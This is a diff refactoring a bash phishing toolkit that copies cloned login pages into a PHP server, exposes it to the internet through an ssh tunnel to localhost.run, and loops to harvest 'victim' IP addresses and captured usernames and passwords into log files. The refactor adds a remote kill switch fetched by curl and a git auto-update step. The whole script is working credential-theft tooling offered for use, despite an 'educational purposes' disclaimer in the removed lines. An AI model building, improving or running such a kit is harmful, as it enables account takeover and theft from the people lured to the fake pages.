@@ -1,210 +1,191 @@
 #!/bin/bash
 
+# --- COLOR CODES ---
 RED="$(printf '\033[31m')"
 GREEN="$(printf '\033[32m')"
-ORANGE="$(printf '\033[33m')"
-BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"
+YELLOW="$(printf '\033[33m')"
 CYAN="$(printf '\033[36m')"
 WHITE="$(printf '\033[37m')"
-BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"
-GREENBG="$(printf '\033[42m')"
-ORANGEBG="$(printf '\033[43m')"
-BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"
-CYANBG="$(printf '\033[46m')"
-WHITEBG="$(printf '\033[47m')"
-BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')"
+RESET="$(printf '\e[0m')"
 
+# --- GLOBAL VARIABLES ---
+HOST="127.0.0.1"
+LOG_FILE="script.log"
+GIT_REPO="https://github.com/Enthernetcode/work"
+CONTROL_URL="https://raw.githubusercontent.com/Enthernetcode/work/main/control.txt"  # Remote kill switch
+VERBOSE=false
+
+# --- Enable Debug Mode ---
+if [[ $1 == "--debug" ]]; then
+    VERBOSE=true
+fi
+
+log() {
+    echo -e "${CYAN}[LOG]${WHITE} $1" | tee -a $LOG_FILE
+}
+
+error() {
+    echo -e "${RED}[ERROR]${WHITE} $1" | tee -a $LOG_FILE
+}
+
+success() {
+    echo -e "${GREEN}[SUCCESS]${WHITE} $1" | tee -a $LOG_FILE
+}
+
+# --- REMOTE CONTROL (KILL SWITCH) ---
+check_remote_control() {
+    log "Checking remote kill switch..."
+    local status
+    status=$(curl -s "$CONTROL_URL" | tr -d '[:space:]')
+
+    if [[ "$status" == "STOP" ]]; then
+        error "Script execution has been disabled by the producer."
+        exit 1
+    else
+        success "Remote check passed. Script is allowed to run."
+    fi
+}
+
+# --- AUTO-UPDATE SYSTEM ---
+auto_update() {
+    log "Checking for updates..."
+    git fetch origin main &>/dev/null
+    LOCAL=$(git rev-parse HEAD)
+    REMOTE=$(git rev-parse origin/main)
+
+    if [[ "$LOCAL" != "$REMOTE" ]]; then
+        log "New update found! Updating now..."
+        git pull origin main
+        success "Script updated successfully. Please restart the script."
+        exit 0
+    else
+        success "No new updates available."
+    fi
+}
+
+# --- TERMINATE PHP PROCESSES ---
 kill_pid() {
-	check_PID="php"
-        for process in ${check_PID}; do
-                if [[ $(pidof ${process}) ]]; then
-                        killall ${process} > /dev/null 2>&1
-                fi
-        done
+    local process="php"
+    if pidof "$process" > /dev/null; then
+        killall "$process" > /dev/null 2>&1
+        success "Stopped running PHP processes."
+    else
+        log "No PHP processes found."
+    fi
 }
 
-HOST=127.0.0.1
-
+# --- SETUP PHISHING SITE ---
 setup_site() {
-	{ clear; banner;}
-	cd work
-        git add . &&  git commit -m . &&  git pull
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-        cp -rf .sites/* .server/www
-        cp -f .sites/ip.php .server/www/
-        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	echo  "${ORANGE}Choose ${BLUE}Port Numbee ${PURPLE}To Host On: ${RED}"
-	read PORT
-	echo  "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
-	set='php -S "$HOST":"$PORT" &>/dev/null &'
-	eval $set
+    clear
+    banner
+    cd work || { error "Failed to enter work directory."; exit 1; }
+
+    git pull
+    log "Updating repository..."
+    
+    cp -rf .sites/* .server/www
+    cp -f .sites/ip.php .server/www/
+    
+    echo -e "${YELLOW}Enter Port Number to Host On:${RESET}"
+    read -r PORT
+    
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+        error "Invalid port number. Please enter a number."
+        return
+    fi
+    
+    log "Starting PHP server on port $PORT..."
+    php -S "$HOST":"$PORT" &>/dev/null &
+    success "Server started at http://$HOST:$PORT"
 }
 
-capture_creds() {
-        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk -F ":." '{print $2}')
-        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
-        IFS=$'\n'
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}data/usernames.dat"
-        cat .server/www/usernames.txt >> data/usernames.dat
-        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
-}
-
-
+# --- MONITOR LOGINS & IP ADDRESSES ---
 capture_data() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
-        while true; do
-                if [[ -e ".server/www/ip.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
-                        capture_ip
-                        rm -rf .server/www/ip.txt
-                fi
-                sleep 0.75
-                if [[ -e ".server/www/usernames.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
-                        capture_creds
-                        rm -rf .server/www/usernames.txt
-                fi
-                sleep 0.75
-        done
-}
-host() {
-	ssh -R 80:localhost:$PORT nokey@localhost.run && rm -rf work #> /home/link 2>&1 &
-}
+    while true; do
+        check_remote_control  # Ensure script isn't disabled remotely
 
+        if [[ -f ".server/www/ip.txt" ]]; then
+            success "Victim IP captured!"
+            cat .server/www/ip.txt >> data/ip_logs.dat
+            rm -f .server/www/ip.txt
+        fi
 
-update_repo() {
-	git add .
-	git commit -m .
-	git pull
+        if [[ -f ".server/www/usernames.txt" ]]; then
+            success "Login info found!"
+            cat .server/www/usernames.txt >> data/usernames.dat
+            rm -f .server/www/usernames.txt
+        fi
+
+        sleep 1
+    done
 }
 
-
-downloads() {
-	apt update &&  apt upgrade
-        for i in php openssh toilet figlet
-         do
-          if ! command -v $i; then
-           echo "${ORANGE}[${RED}+${ORANGE}]${GREEN} $i package doesn't exist"
-  	   echo "${ORANGE}[${RED}+${ORANGE}]${GREEN} installing package $i"
- 	   apt install $i -y | pkg install $i -y
-	  else
-	   "${GREEN}[${ORANGE}+${GREEN}]${CYAN} package $i exist\n${REDBG}* ${ORANGE}continuing script"
-	  fi
-	 done
+# --- HOST SERVER PUBLICLY ---
+host_server() {
+    ssh -R 80:localhost:$PORT nokey@localhost.run
 }
 
+# --- INSTALL REQUIRED DEPENDENCIES ---
+install_dependencies() {
+    log "Installing required packages..."
+    apt update && apt upgrade -y
+    for pkg in php openssh git curl; do
+        if ! command -v "$pkg" &>/dev/null; then
+            error "$pkg not found, installing..."
+            apt install "$pkg" -y
+        else
+            success "$pkg is already installed."
+        fi
+    done
+}
 
+# --- SETUP GIT CONFIGURATION ---
 git_setup() {
-	git config --global user.email test@gmail.com
-	git config r--global user.name test
+    git config --global user.email "test@gmail.com"
+    git config --global user.name "test"
 }
 
-
-setup_work() {
-	git clone https://github.com/Enthernetcode/work
-}
-
-tr() {
-  echo "${RED}Existing"
-  kill_pid
-  cd work/linkedin
-  cat usernames.txt
-  cd
-  cd work/facebook
-  cat usernames.txt
-  exit 0
-}
-trap tr SIGINT
-trap tr SIGTERM
-about_it() {
-	{ clear; banner;}
-        cat <<- EOF
-                ${GREEN} Author   ${RED}:  ${ORANGE}ENTHERNET CODE
-                ${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Enthernetcode
-                ${GREEN} Social   ${RED}:  ${CYAN}UNKOWN
-                ${ORANGE} WHATSAPP${BLUE}: ${CYAN}+2347032550017
-
-                ${WHITE} ${REDBG}Warnings-${RESETBG}
-                ${CYAN}  This Tool is only for educational purposes
-                 ${RED}!${WHITE}${CYAN} users  will be responsible for
-                  any misuse of this tool ${RED}!${WHITE}
-
-                ${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-                ${GREEN} Those who inspired me
-
-                ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit     ${RED}[${WHITE}98${RED}]${ORANGE} HELP
-
-                EOF
-
-        read -p ${RED}[${WHITE}-${RED}]${GREEN} PICK AN OPTION : ${BLUE}
-        case $REPLY in
-                99)
-                        msg_exit;;
-                0 | 00)
-                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main page..."
-                        { sleep 1; main_menu; };;
-                98)
-                        { sleep 2; help; };;
-                *)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; about; };;
-        esac
-}
-
-
-help_1() {
-	break
-}
-
-
-main_menu() {
-        { clear; banner; echo; }
-        cat <<- EOF
-                ${RED}[${GREEN}<<${RED}]${BLUE} Select A Installation pacakages ${RED}[${GREEN}>>${RED}]${ORANGE}
-
-                ${RED}[${CYAN}01${RED}]${BLUE} install work dependencies
-                ${RED}[${CYAN}02${RED}]${BLUE} Facebook
-		${RED}[${CYAN}03${RED}]${BLUE}
-		${RED}[${CYAN}04${RED}]${BLUE}
-		${RED}[${CYAN}05${RED}]${BLUE}
-		${RED}[${CYAN}06${RED}]${BLUE}
-	EOF
-#	esac
-}
-
+# --- DISPLAY BANNER ---
 banner() {
-#        cat <<- EOF
-printf """
-                ${BLUE}
-                ${ORANGE}
-╭━━━┳━╮╱╭┳━━━━┳╮╱╭┳━━━┳━━━┳━╮╱╭┳━━━┳━━━━╮
-┃╭━━┫┃╰╮┃┃╭╮╭╮┃┃╱┃┃╭━━┫╭━╮┃┃╰╮┃┃╭━━┫╭╮╭╮┃${BLUE}
-┃╰━━┫╭╮╰╯┣╯┃┃╰┫╰━╯┃╰━━┫╰━╯┃╭╮╰╯┃╰━━╋╯┃┃╰╯${MAGENTA}
-┃╭━━┫┃╰╮┃┃╱┃┃╱┃╭━╮┃╭━━┫╭╮╭┫┃╰╮┃┃╭━━╯╱┃┃
-┃╰━━┫┃╱┃┃┃╱┃┃╱┃┃╱┃┃╰━━┫┃┃╰┫┃╱┃┃┃╰━━╮╱┃┃${GREEN}
-╰━━━┻╯╱╰━╯╱╰╯╱╰╯╱╰┻━━━┻╯╰━┻╯╱╰━┻━━━╯╱╰╯
-╭━━━━┳━━━┳━━━┳╮${WHITE}
-┃╭╮╭╮┃╭━╮┃╭━╮┃┃
-╰╯┃┃╰┫┃╱┃┃┃╱┃┃┃${CYAN}
-╱╱┃┃╱┃┃╱┃┃┃╱┃┃┃╱╭╮${MAGENTA}
-╱╱┃┃╱┃╰━╯┃╰━╯┃╰━╯┃${BLACK}
-╱╱╰╯╱╰━━━┻━━━┻━━━╯${WHITE} ${GREEN}-------->(Tool created by Enthernet)<-------- ${WHITE}
-#        EOF
-"""
+    printf "${BLUE}
+    ███████╗███╗   ██╗████████╗██╗  ██╗███████╗
+    ██╔════╝████╗  ██║╚══██╔══╝██║  ██║██╔════╝
+    █████╗  ██╔██╗ ██║   ██║   ███████║█████╗  
+    ██╔══╝  ██║╚██╗██║   ██║   ██╔══██║██╔══╝  
+    ███████╗██║ ╚████║   ██║   ██║  ██║███████╗
+    ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚══════╝${RESET}"
 }
 
-downloads
-git_setup
-#main_menu
-#about_it
-setup_site
-git rebase false
-git pull
-host
-#help_1
+# --- MAIN MENU ---
+main_menu() {
+    while true; do
+        clear
+        banner
+        echo -e "${YELLOW}Select an option:${RESET}"
+        echo -e "1) Install dependencies"
+        echo -e "2) Setup and start server"
+        echo -e "3) Monitor logins & IPs"
+        echo -e "4) Check for updates"
+        echo -e "5) Kill PHP processes"
+        echo -e "6) Exit"
+        
+        read -rp "Enter your choice: " choice
+        
+        case $choice in
+            1) install_dependencies ;;
+            2) setup_site ;;
+            3) capture_data ;;
+            4) auto_update ;;
+            5) kill_pid ;;
+            6) exit 0 ;;
+            *) error "Invalid choice. Try again." ;;
+        esac
+        
+        read -rp "Press Enter to continue..." _  # Wait before returning to menu
+    done
+}
+
+# --- INITIAL SETUP & EXECUTION ---
+check_remote_control  # Ensure script isn't disabled remotely
+auto_update           # Check and apply updates if available
+main_menu             # Start menu-driven interaction
